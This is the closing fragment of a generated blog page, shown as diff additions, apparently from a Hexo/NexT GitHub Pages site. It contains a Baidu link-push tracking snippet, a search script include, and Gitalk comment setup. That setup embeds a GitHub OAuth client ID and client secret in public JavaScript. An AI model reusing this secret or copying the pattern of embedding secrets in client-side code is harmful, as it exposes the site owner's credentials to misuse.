+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23lioxBWzEMyWt1JhD',
+      clientSecret: '6d63e8f9065e954d63e6a90407d40a3ccee85f0e',
+      repo        : 'Yiaos.github.io',
+      owner       : 'Yiaos',
+      admin       : ['Yiaos'],
+      id          : 'ed0a27b02e793399ff40756292aaa8d0',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
